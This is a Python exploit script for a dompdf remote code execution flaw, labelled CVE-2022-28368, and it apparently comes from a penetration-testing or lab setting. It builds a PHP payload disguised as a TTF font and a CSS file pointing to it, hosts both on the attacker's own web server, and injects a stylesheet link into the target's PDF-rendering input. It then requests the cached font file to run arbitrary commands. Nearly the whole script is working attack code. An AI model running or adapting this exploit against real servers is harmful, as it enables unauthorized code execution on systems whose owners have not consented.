#!/usr/bin/python3

import argparse
import string
import random
from pwn import *
import subprocess
import requests
import netifaces
import sys
import json
import hashlib
from urllib.parse import urlencode

webserver_port = 9001

class dompdf_rce:
    def __init__(self, dompdf, fonts, payload, rhost, query):
        self.dompdf = dompdf
        self.fonts = fonts
        self.payload = payload
        self.rhost = rhost
        self.query = query
        
    def create_file(self):
        filename = ''.join(random.choice(string.ascii_lowercase) for i in range(4))
        log.info(f"Creating malicious PHP -> {filename}.php")
        url_php = f"http://{self.rhost}:{webserver_port}/{filename}.php"
        with open(f"{filename}.php", "w") as f:
            # Bypassing PHP file upload with TTF byte header
            # TTF header = \x00\x01\x00\x00\x00
            f.write(f"\x00\x01\x00\x00\x00{self.payload}")
            f.close()
        log.info(f"Creating malicious CSS -> {filename}.css")    
        with open(f"{filename}.css", "w") as f:
            f.write("""@font-face {
    font-family:'""" + filename + """';
    src:url('""" + url_php + """');
    font-weight:'normal';
    font-style:'normal';
    }
    """)
            f.close()
        return filename,url_php
    
    def xss(self, url_php, filename):
        log.info(f"Starting up web server on port {webserver_port}")
        if re.search("FUZZ", self.query) is not None:
            payload = re.sub("FUZZ", f"<link rel=stylesheet href='http://{self.rhost}:{webserver_port}/{filename}.css'>", self.query)
            log.info(f"Exploiting XSS with external stylesheet ({url_php})")
            try:
                json_data = json.loads(payload)
                query = urlencode(json_data)
            except ValueError:
                json_data = dict((a.strip(), b.strip()) for a, b in (section.split("=", 1) for section in payload.split("&")))
                query = payload
            http_server = subprocess.Popen(['python3', '-m', 'http.server', '9001', '-d', '.'], stdout=subprocess.DEVNULL)
            sleep(3)
            get = requests.get(url = f"{self.dompdf}?{query}", proxies={"http": "http://127.0.0.1:8080"})
            log.info(f"Performing GET request with query -> {get.status_code}")
            post_data = requests.post(self.dompdf, data=json_data, proxies={"http": "http://127.0.0.1:8080"})
            log.info(f"Performing POST request with query -> {post_data.status_code}")
            post_json = requests.post(self.dompdf, json=json_data, proxies={"http": "http://127.0.0.1:8080"})
            log.info(f"Performing POST request with JSON -> {post_json.status_code}")
            log.info(f"Terminating web server on port {webserver_port}")
            http_server.terminate()
            if 200 not in (get.status_code, post_data.status_code, post_json.status_code):
                log.failure("Exploit failed! No 200 status code found in all scenario")
                sys.exit()
            md5sum = hashlib.md5(f'{url_php}'.encode('UTF-8')).hexdigest()
            log.success(f'MD5 hash of "{url_php}" -> {md5sum}')
            url_hash = f"{self.fonts}/{filename}_normal_{md5sum}.php"
            log.success(f'PHP file URL -> "{url_hash}"')
            r = requests.get(url_hash)
            if r.status_code == 200:
                log.info("Triggering PHP")
                log.success("Printing PHP output:")
                print(r.text.replace("\x00", ""))
            else:
                log.failure("File not found! Please check the fonts URL. Normally fonts URL directory located on http://test.com/dompdf/lib/fonts/")
        else:
            log.error(f'Missing "FUZZ" in HTTP query. Query: {self.query}')            
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="dompdf-rce (CVE-2022-28368)")
    parser.add_argument("--dompdf", help="dompdf URL")
    parser.add_argument("--fonts", help="dompdf fonts URL")
    parser.add_argument("--query", help="HTTP query. Please mark with FUZZ. Example: token=abc&input=FUZZ")
    parser.add_argument("--payload", help="Command to execute. Ex: 'ping -c 1 10.10.10.123'")
    args = parser.parse_args()
    if all(arguments is None for arguments in [args.dompdf, args.fonts, args.query, args.payload]):
        log.error("Missing arguments!")
    else:
        try:
            # rhost = "10.10.14.14"
            rhost = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr']
            exploit = dompdf_rce(args.dompdf, args.fonts, args.payload, rhost, args.query)
            x = exploit.create_file()
            filename = x[0]
            url_php = x[1]
            exploit.xss(url_php, filename)
        except ValueError:
            log.error("Missing tun0 interface! Please check your VPN connection")